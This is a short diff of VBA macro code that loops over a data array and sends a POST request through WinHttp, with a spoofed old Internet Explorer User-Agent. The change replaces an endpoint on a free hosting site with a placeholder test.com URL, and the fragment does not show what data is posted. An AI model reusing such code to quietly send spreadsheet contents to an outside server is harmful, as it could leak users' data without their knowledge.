@@ -24,7 +24,7 @@ For i = 2 To UBound(vData, 1)
             Next jSubA
     
 Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
-URL = "http://georgesfarah2114.000webhostapp.com/test.php"
+URL = "http://test.com/test.php"
 objHTTP.Open "POST", URL, False
 objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
 objHTTP.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
